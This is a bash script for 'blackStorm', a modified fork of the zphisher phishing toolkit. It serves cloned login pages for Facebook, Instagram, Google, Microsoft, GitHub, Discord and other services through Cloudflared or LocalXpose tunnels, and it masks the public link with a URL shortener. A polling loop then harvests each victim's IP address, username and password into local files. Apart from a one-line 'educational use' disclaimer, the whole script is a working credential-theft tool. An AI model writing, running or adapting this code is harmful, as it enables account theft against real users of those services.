#!/bin/bash
## blackStorm : Automated Phishing Tool
## Original Author : TAHMID RAYAT (htr-tech)
## Modified Version - No auto-update
## Version : 2.3.5-mod
## Original Github : https://github.com/htr-tech/zphisher

__version__="2.3.5-mod"
HOST='127.0.0.1'
PORT='8080'

# ────────────────────────────────────────────────
#  Colors - Dark & Aggressive Theme
# ────────────────────────────────────────────────
RED=$'\e[38;5;196m'
DARKRED=$'\e[38;5;88m'
PURPLE=$'\e[38;5;135m'
CYAN=$'\e[38;5;51m'
GRAY=$'\e[38;5;245m'
WHITE=$'\e[97m'
BLACK=$'\e[30m'
BOLD=$'\e[1m'
RESET=$'\e[0m'

REDBG=$'\e[41m'
PURPLEBG=$'\e[48;5;93m'
RESETBG=$'\e[49m'

GREEN=$'\e[38;5;82m'
DARKGREEN=$'\e[38;5;28m'
WHITE=$'\e[97m'



BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

# Create necessary directories
mkdir -p ".server" "auth" ".server/www" 2>/dev/null

# Clean old files
rm -rf ".server/.loclx" ".server/.cld.log" 2>/dev/null

# ────────────────────────────────────────────────
#  Signal Handlers
# ────────────────────────────────────────────────


cecho() {
    printf "%b\n" "$1"
}




exit_on_signal_SIGINT() {
    cecho "\n\n${RED}[${WHITE}!${RED}]${DARKRED} Program Interrupted.${RESET}"
    reset_color
    exit 0
}

exit_on_signal_SIGTERM() {
    cecho "\n\n${RED}[${WHITE}!${RED}]${DARKRED} Program Terminated.${RESET}"
    reset_color
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
    printf "%b" "$RESET"
}


# ────────────────────────────────────────────────
#  Kill running processes
# ────────────────────────────────────────────────
kill_pid() {
    for process in php cloudflared loclx; do
        if pidof "$process" >/dev/null 2>&1; then
            killall "$process" >/dev/null 2>&1
        fi
    done
}

# ────────────────────────────────────────────────
#  Internet status (no update check)
# ────────────────────────────────────────────────
check_status() {
    echo -ne "${CYAN}Internet status : ${RESET}"
    if timeout 3 curl -s --head https://api.github.com >/dev/null; then
        cecho "${PURPLE}Online${RESET}"
    else
        cecho "${RED}Offline${RESET}"
    fi
}

# ────────────────────────────────────────────────
#  Banners
# ────────────────────────────────────────────────
banner() {
    clear
    cat << EOF
${GREEN}${BOLD}
 ____  _            _      ____  _                       
| __ )| | __ _  ___| | __ / ___|| |_ ___  _ __ _ __ ___  
|  _ \| |/ _\` |/ __| |/ / \___ \| __/ _ \| '__| '_ \` _ \ 
| |_) | | (_| | (__|   <   ___) | || (_) | |  | | | | | |
|____/|_|\__,_|\___|_|\_\ |____/ \__\___/|_|  |_| |_| |_|
${RESET}
        ${DARKGREEN}${BOLD}black${WHITE} Storm${RESET}   ${GREEN}v${__version__}${RESET}

${GRAY}Dark • Minimal • CLI${RESET}
${DARKGREEN}For educational & lab use only${RESET}
EOF
}

banner_small() {
    printf "%b\n" "\
${GREEN}${BOLD}
  ____  _            _      ____  _                       
 | __ )| | __ _  ___| | __ / ___|| |_ ___  _ __ _ __ ___  
 |  _ \\| |/ _\` |/ __| |/ / \\___ \\| __/ _ \\| '__| '_ \` _ \\ 
 | |_) | | (_| | (__|   <   ___) | || (_) | |  | | | | | |
 |____/|_|\\__,_|\\___|_|\\_\\ |____/ \\__\\___/|_|  |_| |_| |_|
${RESET}
        ${DARKGREEN}${BOLD}Black Storm${RESET}   ${GREEN}v${__version__}${RESET}
"
}


# ────────────────────────────────────────────────
#  Dependencies
# ────────────────────────────────────────────────
dependencies() {
    cecho "${CYAN}Installing required packages...${RESET}"
    pkgs=(php curl unzip)

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        pkg install ncurses-utils proot resolv-conf -y 2>/dev/null
    fi

    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &>/dev/null; then
            cecho "  Installing ${PURPLE}$pkg${RESET}"
            if command -v pkg &>/dev/null; then
                pkg install "$pkg" -y
            elif command -v apt &>/dev/null; then
                sudo apt install "$pkg" -y
            elif command -v pacman &>/dev/null; then
                sudo pacman -S "$pkg" --noconfirm
            else
                cecho "${RED}Cannot install $pkg automatically${RESET}"
            fi
        fi
    done
}

# ────────────────────────────────────────────────
#  Download binaries (cloudflared, loclx)
# ────────────────────────────────────────────────
download() {
    url="$1"
    output="$2"
    file=$(basename "$url")

    curl --silent --fail --retry 3 --location "$url" -o "$file"
    if [[ -f "$file" ]]; then
        if [[ "$file" == *.zip ]]; then
            unzip -qq "$file" >/dev/null 2>&1
        elif [[ "$file" == *.tgz ]]; then
            tar -zxf "$file" >/dev/null 2>&1
        fi
        mv -f "$output" ".server/$output" 2>/dev/null
        chmod +x ".server/$output" 2>/dev/null
        rm -f "$file"
    else
        cecho "${RED}Failed to download $output${RESET}"
        exit 1
    fi
}

install_cloudflared() {
    if [[ ! -f ".server/cloudflared" ]]; then
        cecho "${CYAN}Installing Cloudflared...${RESET}"
        arch=$(uname -m)
        case "$arch" in
            *arm*|*Android*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared' ;;
            *aarch64*)       download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared' ;;
            *x86_64*)        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared' ;;
            *)               download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared' ;;
        esac
    fi
}

install_localxpose() {
    if [[ ! -f ".server/loclx" ]]; then
        cecho "${CYAN}Installing LocalXpose...${RESET}"
        arch=$(uname -m)
        case "$arch" in
            *arm*|*Android*) download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx' ;;
            *aarch64*)       download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx' ;;
            *x86_64*)        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx' ;;
            *)               download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx' ;;
        esac
    fi
}

# ────────────────────────────────────────────────
#  Exit message
# ────────────────────────────────────────────────
msg_exit() {
    clear
    banner
    cecho "\n${PURPLEBG}${BLACK} Thank you for using blackStorm. Stay aware.${RESETBG}\n"
    reset_color
    exit 0
}

# ────────────────────────────────────────────────
#  About
# ────────────────────────────────────────────────
about() {
    clear
    banner
    cat <<- EOF

${CYAN}Tool name     ${DARKRED}:${RESET} blackStorm
${CYAN}Version       ${DARKRED}:${RESET} ${__version__}
${CYAN}Original base ${DARKRED}:${RESET} zphisher by htr-tech
${CYAN}Modified for  ${DARKRED}:${RESET} Dark theme & no auto-update

${RED}Educational purpose only. Misuse is not the responsibility of the author.${RESET}

${PURPLE}[00]${RESET} Main Menu    ${PURPLE}[99]${RESET} Exit
EOF

    read -p "${DARKRED}Select : ${RESET}" opt
    case $opt in
        99) msg_exit ;;
        0|00) main_menu ;;
        *) about ;;
    esac
}

# ────────────────────────────────────────────────
#  Custom port
# ────────────────────────────────────────────────
cusport() {
    echo
    read -n1 -p "${CYAN}Use custom port? ${PURPLE}[y/N]${RESET} : " P_ANS
    if [[ ${P_ANS,,} == "y" ]]; then
        read -n4 -p "${CYAN}Enter 4-digit port (1024-9999) : ${RESET}" CU_P
        if [[ "$CU_P" =~ ^[1-9][0-9]{3}$ && "$CU_P" -ge 1024 && "$CU_P" -le 9999 ]]; then
            PORT=$CU_P
        else
            cecho "${RED}Invalid port! Using default $PORT${RESET}"
            sleep 2
        fi
    fi
}

# ────────────────────────────────────────────────
#  Setup & start server functions
# ────────────────────────────────────────────────
setup_site() {
    cecho "${DARKRED}Setting up server...${RESET}"
    cp -rf ".sites/$website/"* ".server/www/" 2>/dev/null
    cp -f ".sites/ip.php" ".server/www/" 2>/dev/null
    cecho "${CYAN}Starting PHP server on ${PURPLE}http://$HOST:$PORT${RESET}"
    cd ".server/www" && php -S "$HOST":"$PORT" >/dev/null 2>&1 &
}

capture_ip() {
    IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs 2>/dev/null)
    [[ -n "$IP" ]] && cecho "${PURPLE}Victim IP   : ${CYAN}$IP${RESET}"
    cecho "${GRAY}Saved to    : auth/ip.txt${RESET}"
    cat .server/www/ip.txt >> auth/ip.txt 2>/dev/null
}

capture_creds() {
    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}' 2>/dev/null)
    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}' 2>/dev/null)
    [[ -n "$ACCOUNT" ]] && cecho "${PURPLE}Username    : ${CYAN}$ACCOUNT${RESET}"
    [[ -n "$PASSWORD" ]] && cecho "${PURPLE}Password    : ${CYAN}$PASSWORD${RESET}"
    cecho "${GRAY}Saved to    : auth/usernames.dat${RESET}"
    cat .server/www/usernames.txt >> auth/usernames.dat 2>/dev/null
}

capture_data() {
    cecho "${CYAN}Waiting for data... ${RED}Ctrl+C${RESET} to stop"
    while true; do
        if [[ -f ".server/www/ip.txt" ]]; then
            cecho "\n${PURPLE}IP captured!${RESET}"
            capture_ip
            rm -f ".server/www/ip.txt"
        fi
        if [[ -f ".server/www/usernames.txt" ]]; then
            cecho "\n${PURPLE}Credentials captured!${RESET}"
            capture_creds
            rm -f ".server/www/usernames.txt"
        fi
        sleep 0.8
    done
}

# ────────────────────────────────────────────────
#  Tunneling services
# ────────────────────────────────────────────────
start_cloudflared() {
    cusport
    setup_site
    cecho "${CYAN}Launching Cloudflared...${RESET}"
    ./.server/cloudflared tunnel -url "$HOST:$PORT" --logfile .server/.cld.log >/dev/null 2>&1 &
    sleep 8
    cld_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null)
    custom_url "$cld_url"
    capture_data
}

start_loclx() {
    cusport
    setup_site
    if [[ ! -f "$HOME/.localxpose/.access" ]]; then
        cecho "${RED}LocalXpose token required!${RESET}"
        cecho "Create account → https://localxpose.io"
        read -p "${CYAN}Enter token : ${RESET}" token
        [[ -n "$token" ]] && echo "$token" > "$HOME/.localxpose/.access"
    fi
    ./.server/loclx tunnel --raw-mode http -t "$HOST:$PORT" > .server/.loclx 2>&1 &
    sleep 10
    loclx_url=$(grep -o '[0-9a-zA-Z.-]*.loclx.io' .server/.loclx | head -1 2>/dev/null)
    custom_url "$loclx_url"
    capture_data
}

start_localhost() {
    cusport
    setup_site
    clear
    banner_small
    cecho "\n${PURPLE}Hosted at : ${CYAN}http://$HOST:$PORT${RESET}"
    capture_data
}

tunnel_menu() {
    clear
    banner_small
    echo
    cecho "${DARKRED}┌───────────────────────────────┐${RESET}"
    cecho "│       Tunnel Selection        │"
    cecho "${DARKRED}├───────────────────────────────┤${RESET}"
    cecho "│ ${CYAN}1${RESET}  Localhost                   │"
    cecho "│ ${CYAN}2${RESET}  Cloudflared                 │"
    cecho "│ ${CYAN}3${RESET}  LocalXpose                  │"
    cecho "${DARKRED}└───────────────────────────────┘${RESET}"
    read -p "${DARKRED}Select : ${RESET}" tun
    case $tun in
        1) start_localhost ;;
        2) start_cloudflared ;;
        3) start_loclx ;;
        *) tunnel_menu ;;
    esac
}

# ────────────────────────────────────────────────
#  URL shortener & mask
# ────────────────────────────────────────────────
custom_url() {
    url=${1#http*//}
    if [[ -z "$url" ]]; then
        cecho "${RED}No tunnel URL available${RESET}"
        return
    fi

    isgd="https://is.gd/create.php?format=simple&url="
    short=$(curl -s "$isgd$1" 2>/dev/null)
    [[ -z "$short" ]] && short=$(curl -s "https://api.shrtco.de/v2/shorten?url=$1" | grep -o '"short_link":"[^"]*' | cut -d'"' -f4 2>/dev/null)

    cecho "${CYAN}Original  : ${PURPLE}$1${RESET}"
    [[ -n "$short" ]] && cecho "${CYAN}Shortened : ${PURPLE}$short${RESET}"
}

# ────────────────────────────────────────────────
#  Sites (remaining ones only)
# ────────────────────────────────────────────────
site_facebook() {
    cecho "${CYAN}Facebook pages${RESET}"
    echo " 1  Traditional"
    echo " 2  Advanced Poll"
    echo " 3  Fake Security"
    echo " 4  Messenger"
    read -p "${DARKRED}Select : ${RESET}" fb
    case $fb in
        1) website="facebook" ;;
        2) website="fb_advanced" ;;
        3) website="fb_security" ;;
        4) website="fb_messenger" ;;
        *) site_facebook ;;
    esac
    tunnel_menu
}

site_instagram() {
    cecho "${CYAN}Instagram pages${RESET}"
    echo " 1  Traditional"
    echo " 2  Followers"
    echo " 3  1000 Followers"
    echo " 4  Blue Badge"
    read -p "${DARKRED}Select : ${RESET}" ig
    case $ig in
        1) website="instagram" ;;
        2) website="ig_followers" ;;
        3) website="insta_followers" ;;
        4) website="ig_verify" ;;
        *) site_instagram ;;
    esac
    tunnel_menu
}

site_gmail() {
    cecho "${CYAN}Google pages${RESET}"
    echo " 1  Old Gmail"
    echo " 2  New Gmail"
    echo " 3  Poll"
    read -p "${DARKRED}Select : ${RESET}" gm
    case $gm in
        1) website="google" ;;
        2) website="google_new" ;;
        3) website="google_poll" ;;
        *) site_gmail ;;
    esac
    tunnel_menu
}

# ────────────────────────────────────────────────
#  Main Menu (reduced)
# ────────────────────────────────────────────────
main_menu() {
    clear
    banner
    cat <<- EOF

${DARKRED}┌─────────────────────────────────────────────┐${RESET}
│               Select Target                 │
${DARKRED}├─────────────────────────────────────────────┤${RESET}
│ ${CYAN}01${RESET}  Facebook        ${CYAN}02${RESET}  Instagram       │
│ ${CYAN}03${RESET}  Google          ${CYAN}04${RESET}  Microsoft       │
│ ${CYAN}05${RESET}  Netflix         ${CYAN}10${RESET}  Tiktok          │
│ ${CYAN}11${RESET}  Twitch          ${CYAN}12${RESET}  Pinterest       │
│ ${CYAN}13${RESET}  Snapchat        ${CYAN}14${RESET}  Linkedin        │
│ ${CYAN}21${RESET}  DeviantArt      ${CYAN}22${RESET}  Badoo           │
│ ${CYAN}23${RESET}  Origin          ${CYAN}24${RESET}  DropBox         │
│ ${CYAN}33${RESET}  Github          ${CYAN}34${RESET}  Discord         │
${DARKRED}├─────────────────────────────────────────────┤${RESET}
│ ${PURPLE}99${RESET}  About           ${PURPLE}00${RESET}  Exit            │
${DARKRED}└─────────────────────────────────────────────┘${RESET}

EOF

    read -p "${DARKRED}Select → ${RESET}" opt

    case $opt in
        01|1)   site_facebook ;;
        02|2)   site_instagram ;;
        03|3)   site_gmail ;;
        04|4)   website="microsoft"; tunnel_menu ;;
        05|5)   website="netflix"; tunnel_menu ;;
        10)     website="tiktok"; tunnel_menu ;;
        11)     website="twitch"; tunnel_menu ;;
        12)     website="pinterest"; tunnel_menu ;;
        13)     website="snapchat"; tunnel_menu ;;
        14)     website="linkedin"; tunnel_menu ;;
        21)     website="deviantart"; tunnel_menu ;;
        22)     website="badoo"; tunnel_menu ;;
        23)     website="origin"; tunnel_menu ;;
        24)     website="dropbox"; tunnel_menu ;;
        33)     website="github"; tunnel_menu ;;
        34)     website="discord"; tunnel_menu ;;
        99)     about ;;
        0|00)   msg_exit ;;
        *)      main_menu ;;
    esac
}

# ────────────────────────────────────────────────
#  Start
# ────────────────────────────────────────────────
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
